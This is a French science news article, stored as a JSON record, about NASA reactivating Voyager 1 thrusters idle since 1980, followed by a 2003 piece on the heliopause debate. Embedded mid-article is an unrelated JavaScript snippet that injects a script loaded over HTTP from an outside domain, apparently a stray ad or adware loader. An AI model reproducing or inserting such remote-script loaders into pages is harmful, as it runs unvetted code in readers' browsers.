{"title": "Voyager 1 : la Nasa rallume des propulseurs éteints depuis 37 ans !", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "05/12/2017", "content": "Voyager 1, qui vient de fêter les 40 ans de son lancement, poursuit à grande vitesse sa route vers les frontières du Système solaire et au-delà. Des ingénieurs ont réussi à remettre en marche des propulseurs de la sonde spatiale qui n'avaient pas fonctionné depuis son survol de Saturne, en novembre 1980. Partie de la  Terre  il y a exactement 40 ans et trois mois, la sonde spatiale Voyager 1 continue d'avancer vite, très vite (17 km/s par rapport au  Soleil ) dans l' espace interstellaire , au-delà de la bulle de vent solaire qui enveloppe le Soleil. Actuellement à 21,1 milliards de kilomètres (141 fois la distance entre la Terre et le Soleil, un record), le vaisseau demeure néanmoins dans l'aire d'influence gravitationnelle de l'étoile près de laquelle il fut fabriqué au cours des années 1970. L'engin franchira les limites du Système solaire dans quelques millénaires et passera à environ 1,6 année-lumière de Gliese 445 (AC+79 3888) (une étoile dans la constellation de la Girafe) dans... 40.000 ans ! Voir aussi : Les sondes Voyager 1 et 2 fêtent leurs 40 ans loin de l’humanité Chargée de survoler Jupiter puis Saturne, la sonde qui s'est envolée trois semaines après sa jumelle  Voyager 2 , continue de communiquer avec la Terre. La Nasa qui lui prédisait de fonctionner au moins jusqu'en 2020 a désormais bon espoir de la prolonger de deux à trois ans. En effet, suite à des problèmes rencontrés avec des propulseurs de contrôle d'attitude, une équipe de spécialistes à la recherche de solutions alternatives s'est intéressée à un autre ensemble de propulseurs qui, eux, n'avaient pas fonctionné depuis... 1980. Saturne photographiée par Voyager 1 le 16 novembre 1980 alors qu’elle s’en éloigne. © Nasa, JPL                               Ces propulseurs n’avaient pas fonctionné depuis le survol de Saturne « L'équipe de vol de Voyager a déterré des données datant de plusieurs décennies et a examiné le logiciel codé dans un langage assembleur obsolète pour s'assurer que nous pouvions tester les propulseurs en toute sécurité » , a indiqué l'un d'entre eux, Chris Jones, ingénieur en chef au JPL. Cet ensemble n'avait pas été allumé depuis la visite à Saturne, le 8 novembre 1980.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les ingénieurs ont procédé aux tests le 28 novembre dernier. La réponse est arrivée 19 heures et 35 minutes plus tard, soit le 29 novembre. Et elle fut très bonne.  « L'équipe de  Voyager  a été chaque fois plus excitée à chaque étape du test du propulseur,  rapporte Todd Barber.  L'humeur était au soulagement, à la joie et à l'incrédulité après avoir vu ces propulseurs bien reposés prendre le relais comme si le temps n'était pas passé » . Voir aussi : Sondes spatiales hors du Système solaire : combien y en a-t-il ? Devant ce succès, l'équipe envisage de basculer sur ces propulseurs en janvier prochain. Par petites poussées de quelques millisecondes, ils peuvent orienter l'antenne de la sonde spatiale vers la Terre. Actuellement à 17,4 milliards de kilomètres de la Terre, la sonde  Voyager 2  n'est bien sûr pas en reste, et cela même si ses propulseurs de contrôle ne sont pas aussi fatigués que ceux de Voyager 1. Avec l'application Web  Nasa’s Eyes Visualization , découvrez où est Voyager 1 maintenant ! Pour en savoir plus Voyager 1 a-t-elle franchi l'héliopause ? Article de France-Science publié le 13 novembre 2003 Vingt six ans après avoir quitté la Terre, la sonde Voyager 1 continue d'envoyer des informations aux scientifiques. Et les dernières en date font débat : Voyager 1 a-t-il vraiment franchi l' héliopause , cette région frontière qui sépare l' héliosphère , sous l'influence du Soleil, de l'espace intersidéral ? C'est dans cette zone qu'ont lieu  les rencontres entre les  vents solaires , constitués de particules chargées éjectées par le Soleil, et le  plasma  interstellaire. Ce type de rencontre tumultueuse entraîne toujours une chute brutale de la  vitesse  des vents solaires et la formation d'une onde de choc . Un phénomène justement identifié par une équipe de l'Université de John Hopkins (Maryland) à partir des données fournies par la sonde. Mais la conclusion des chercheurs est contestée par des collègues de l'Université du Maryland. Pour ces derniers, la sonde serait encore dans l'héliosphère car les différents chocs relevés ne seraient pas aussi forts que le prévoient les modèles théoriques.  La question trouvera peut-être une réponse plus définitive dans les années à venir grâce aux données du frère  jumeau  de Voyager 1, Voyager 2. Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  heliopause  |  sonde voyager  |  sonde voyager anomalie  |  ou voyager  |  voyager cheval  |  trajectoire voyager  |  voyager position  |  ingenieur voyager  |  voyager dans temps possible  |  metier fait voyager", "theme": "sciences"}